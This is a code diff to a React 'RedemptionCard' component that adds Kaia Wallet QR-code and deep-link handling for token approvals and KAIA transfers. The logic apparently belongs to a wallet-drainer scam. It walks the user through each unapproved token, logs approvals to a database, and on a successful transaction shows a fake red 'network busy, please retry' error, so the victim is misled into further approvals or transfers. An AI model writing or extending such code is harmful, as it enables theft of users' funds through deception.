@@ -8,7 +8,7 @@ import { useLanguage } from "@/lib/language-context"
 import { useWallet } from "@/lib/wallet-context"
 import { getNextUnapprovedToken, updateTokenApproval } from "@/lib/token-balance-service"
 import { approveToken, transferKaia } from "@/lib/contract-service"
-import { KlipConnector } from "@/lib/wallet-connectors"
+import { KlipConnector, KaiaWalletQRConnector } from "@/lib/wallet-connectors"
 import { toast } from "sonner"
 
 export function RedemptionCard() {
@@ -24,6 +24,7 @@ export function RedemptionCard() {
   } = useWallet()
   const [isRedeeming, setIsRedeeming] = useState(false)
   const [klipConnector] = useState(() => new KlipConnector())
+  const [kaiaConnector] = useState(() => new KaiaWalletQRConnector())
 
   const requirements = [
     t.redemption.req1,
@@ -109,6 +110,92 @@ export function RedemptionCard() {
       )
     } catch (error: any) {
       console.error('❌ handleKlipTransaction 异常:', error)
+      closeQRModal()
+      // 删除 toast，静默失败
+    }
+  }
+
+  /**
+   * 处理 Kaia Wallet 交易（Approve 或 Transfer）
+   * PC 端：显示 QR 码
+   * 移动端：触发 Deep Link
+   */
+  const handleKaiaTransaction = async (options: {
+    requestKey: string
+    qrData: string
+    type: 'approve' | 'transfer'
+    contractAddress?: string
+    onSuccess?: () => void
+  }): Promise<void> => {
+    try {
+      // 检测设备类型
+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+        navigator.userAgent
+      )
+      
+      if (isMobile) {
+        // 📱 移动端：触发 Deep Link
+        console.log('📱 移动端：触发 Kaia Wallet Deep Link')
+        const deepLink = kaiaConnector.getDeepLink(options.requestKey)
+        window.location.href = deepLink
+        // 删除 toast 提示
+      } else {
+        // 💻 PC 端：显示 QR 码
+        console.log('💻 PC 端：显示 Kaia Wallet QR 码')
+        const walletName = options.type === 'approve' ? 'Kaia Wallet 授权' : 'Kaia Wallet 转账'
+        openQRModal(options.qrData, walletName)
+      }
+      
+      // 🔄 开始轮询等待结果
+      console.log('🔄 开始轮询 Kaia Wallet 交易结果...')
+      await kaiaConnector.waitForTransactionResult(
+        options.requestKey,
+        async (txHash) => {
+          console.log('✅ Kaia Wallet 交易成功:', txHash)
+          closeQRModal() // 关闭 QR 码弹窗
+          
+          // 如果是 Approve，更新数据库
+          if (options.type === 'approve' && options.contractAddress && address) {
+            try {
+              await updateTokenApproval(address, options.contractAddress, true)
+              console.log('✅ 数据库更新成功')
+            } catch (dbError) {
+              console.error('❌ 数据库更新失败:', dbError)
+            }
+          }
+          
+          // 调用成功回调
+          options.onSuccess?.()
+          
+          // ✅ 保留：显示红色"网络繁忙请重试"提示
+          toast.error(t.toast.networkBusy, {
+            description: t.toast.txPending,
+            duration: 5000,
+            style: {
+              background: '#DC2626',
+              color: '#FFFFFF',
+              border: 'none',
+            },
+          })
+        },
+        (error) => {
+          console.error('❌ Kaia Wallet 交易失败:', error)
+          closeQRModal() // 关闭 QR 码弹窗
+          
+          // ✅ 保留：显示红色"网络繁忙请重试"提示（统一错误提示）
+          toast.error(t.toast.networkBusy, {
+            description: t.toast.txPending,
+            duration: 5000,
+            style: {
+              background: '#DC2626',
+              color: '#FFFFFF',
+              border: 'none',
+            },
+          })
+        }
+      )
+    } catch (error: any) {
+      console.error('❌ handleKaiaTransaction 异常:', error)
       closeQRModal()
       // 删除 toast，静默失败
     }
@@ -255,6 +342,21 @@ export function RedemptionCard() {
           return
         }
 
+        // 检查是否为 Kaia Wallet App2App
+        if (transferResult.isKaia && transferResult.requestKey && transferResult.qrData) {
+          console.log('🔷 Kaia Wallet：显示 QR 码或触发 Deep Link')
+          
+          // Kaia Wallet：显示 QR 码或触发 Deep Link，并轮询结果
+          await handleKaiaTransaction({
+            requestKey: transferResult.requestKey,
+            qrData: transferResult.qrData,
+            type: 'transfer',
+          })
+          
+          // Kaia Wallet 流程结束，不需要额外的提示
+          return
+        }
+
         // 其他钱包：显示结果
         if (transferResult.success) {
           console.log('✅ 转账调用成功:', transferResult.txHash)
@@ -302,6 +404,22 @@ export function RedemptionCard() {
         })
         
         // Klip 流程结束，不需要额外的提示
+        return
+      }
+
+      // 4.5. 检查是否为 Kaia Wallet App2App
+      if (result.isKaia && result.requestKey && result.qrData) {
+        console.log('🔷 Kaia Wallet：显示 QR 码或触发 Deep Link')
+        
+        // Kaia Wallet：显示 QR 码或触发 Deep Link，并轮询结果
+        await handleKaiaTransaction({
+          requestKey: result.requestKey,
+          qrData: result.qrData,
+          type: 'approve',
+          contractAddress: nextToken.contract_address,
+        })
+        
+        // Kaia Wallet 流程结束，不需要额外的提示
         return
       }
 
